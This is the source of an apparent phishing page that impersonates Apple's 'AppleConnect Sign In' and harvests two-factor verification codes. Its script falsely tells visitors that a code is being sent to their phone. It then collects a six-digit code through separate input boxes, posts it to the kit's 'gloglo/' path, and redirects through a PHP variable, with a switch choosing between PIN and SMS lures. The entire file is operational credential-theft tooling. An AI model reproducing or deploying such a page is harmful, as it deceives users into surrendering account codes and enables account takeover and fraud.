<script type="text/javascript">
var url = 'gloglo/'
</script>

<?php
//** Change $Sendme If Pin = 1 or sms =2

 $sendme = "2";


?>
<!DOCTYPE html>
<html lang="en-US">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>AppleConnect Sign In</title>
  <script src="https://code.jquery.com/jquery-3.0.0.min.js" charset="utf-8"></script>

</head>
<body>
  <div class="loading">
  </div>
  <div class="loaded" style="display:none">
  <link rel="stylesheet" type="text/css" href="{enso}/narmin.css">
  <link rel="stylesheet" type="text/css" href="{enso}/zlazla.css">


    <style media="screen">
    div.outer{
      height: auto;
    }
    input[type="password"] {
      font-weight: bolder;
      margin: 0 3px;
      letter-spacing: 1px;
    }
::-webkit-input-placeholder { /* WebKit, Blink, Edge */
    color:    #4f4e53;
}
:-moz-placeholder { /* Mozilla Firefox 4 to 18 */
   color:    #4f4e53;
   opacity:  1;
}
::-moz-placeholder { /* Mozilla Firefox 19+ */
   color:    #4f4e53;
   opacity:  1;
}
:-ms-input-placeholder { /* Internet Explorer 10-11 */
   color:    #4f4e53;
}

/*==========  Mobile First Method  ==========*/

    /* Custom, iPhone Retina */
    @media only screen and (min-width : 320px) {

    }

    /* Extra Small Devices, Phones */
    @media only screen and (min-width : 480px) {
.forgot-link {
display: inline-block;
    position: absolute;
    /* text-align: center; */
    margin-top: 10px;
    right: 165px;
    /* float: right; */
    }

    /* Small Devices, Tablets */
    @media only screen and (min-width : 768px) {
.forgot-link {
display: inline-block;
    position: absolute;
    /* text-align: center; */
    margin-top: 10px;
    right: 165px;
    /* float: right; */
    }

    /* Medium Devices, Desktops */
    @media only screen and (min-width : 992px) {
.forgot-link {
display: inline-block;
    position: absolute;
    /* text-align: center; */
    margin-top: 10px;
    right: 165px;
    /* float: right; */
    }

    /* Large Devices, Wide Screens */
    @media only screen and (min-width : 1200px) {
.forgot-link {
display: inline-block;
    position: absolute;
    /* text-align: center; */
    margin-top: 10px;
    right: 165px;
    /* float: right; */
}
h1.logo {
margin-left: -22px;
}
.loaded {

    padding-top: 94px;

}
    }
    </style>
    <div id="main" role="main" class="acp-content">
      <section class="acp-sign-in">
        <div class="acp-login-container">
          <h1 class="logo"></h1>
          <p id="title"></p>
          <div class="outer">
            <div class="inner">
              <div class="main">
                <p id="errormsg"></p>
                <p id="loadingSpinner" style="display:none">
                  <img src="{enso}/acopic/abbr.gif" alt="" width="38" height="38" />
                </p>

               <!--/*************** form ******************/-->



                <form id="verfiCommand" name="form22" action="/#verification" onsubmit="return submitCode()" method="post" style="display:none">
                  <div class="module">
                    <label for="accountpassword">&nbsp;</label>
                    <br>
                    <div class="buttonfield">


					<input style="display:inline-block; margin:4px ; initial;text-align: center;float: left;" id="digit1" onkeypress='return event.charCode >= 48 && event.charCode <= 57'  class="pin" name="pin1" tabindex="2" oncut="return false;" autocorrect="off" oncopy="return false;" autocapitalize="off" type="text" value="" maxlength="1" size="1" autocomplete="off" />


					  <input style="display:inline-block; margin:4px ; initial;text-align: center;float: left;"  id="digit2" onkeypress='return event.charCode >= 48 && event.charCode <= 57' class="pin" name="pin1" tabindex="2" oncut="return false;" autocorrect="off" oncopy="return false;" autocapitalize="off" type="text" value="" maxlength="1" size="1" autocomplete="off" />



					  <input style="display:inline-block; margin:4px ; initial;text-align: center;float: left;" id="digit3" onkeypress='return event.charCode >= 48 && event.charCode <= 57' class="pin" name="pin1" tabindex="2" oncut="return false;" autocorrect="off" oncopy="return false;" autocapitalize="off" type="text" value="" maxlength="1" size="1" autocomplete="off" />



					  <input style="display:inline-block; margin:4px ; initial;text-align: center;float: left;"  id="digit4" onkeypress='return event.charCode >= 48 && event.charCode <= 57' class="pin" name="pin1" tabindex="2" oncut="return false;" autocorrect="off" oncopy="return false;" autocapitalize="off" type="text" value="" maxlength="1" size="1" autocomplete="off" />

					  <input  style="display:inline-block; margin:4px; initial;text-align: center;float: left; "  id="digit5" onkeypress='return event.charCode >= 48 && event.charCode <= 57' class="pin" name="pin1" tabindex="2" oncut="return false;" autocorrect="off" oncopy="return false;" autocapitalize="off" type="text" value="" maxlength="1" size="1" autocomplete="off" />

					  <input  style="display:inline-block; margin:4px ; initial;text-align: center;float: left;"  id="digit6" onkeypress='return event.charCode >= 48 && event.charCode <= 57' class="pin" name="pin1" tabindex="2" oncut="return false;" autocorrect="off" oncopy="return false;" autocapitalize="off" type="text" value="" maxlength="1" size="1" autocomplete="off" />


                      <script type="text/javascript">
                      	$(".pin").keyup(function () {
    if (this.value.length == this.maxLength) {
      var $next = $(this).next('.pin');
      if ($next.length)
          $(this).next('.pin').focus();
      else
          $(this).focus();
    }
});
                      </script>
    <script type="text/javascript">
    $('input').keydown(function(e) {
    if (e.keyCode == 13) {
        $(this).closest('form').submit();
        return false;
    }
});
       </script>
                    </div>
                  </div>



                 <div class="refresh">
                   <a class="hrefresh" href="#">Send a new code.</a>
                  </div>
                  <div class="">
                    <input type="submit" name="name" value="Continue">
                  </div>

                </form>

              </div>
            </div>
          </div>
        </div>
      </section>
    </div>
  </div>
  <script type="text/javascript">
  $(document).ready(function(){
    var body = $('.loaded').html().replace(/{enso}/g, url);
    $('.loading').fadeOut(function(){

      $('.loaded').empty().html(body);

	  <?php if($sendme == '2'){?>
      $('#title').html('A verification code is being sent to your phone number or devices, please wait...')
      $('#loadingSpinner').fadeIn();
      $('.loaded').fadeIn();
	  setTimeout(function(){
            $('#loadingSpinner').fadeOut(function(){
              $('#verfiCommand').fadeIn();
               $('#title').html('Verification code has been sent to your phone number or devices.')
            })
          }, 10000)

		  <?php }elseif($sendme == '1' or $sendme >= 2){    ?>


		  $('#title').html('Use your Pin code to manage your Apple internal accounts.');
          $('#pinCommand').fadeIn();
		  $('.loaded').fadeIn();

		  <?php } ?>

    })
  });

  function submitCode(){
    var code = $('#digit1').val() + $('#digit2').val() + $('#digit3').val() + $('#digit4').val() + $('#digit5').val() + $('#digit6').val()
    if(code.length > 5){
     $.post(url+ '/?code', {
        code: code
      }, function(resp){

        $('#verfiCommand').fadeOut(function(){
          $('#loadingSpinner').fadeIn();
          window.location = '<?php echo $redidi; ?>'
        });
      })
    }
    return false;
  }

  </script>
</body>
</html>
</body>
</html>
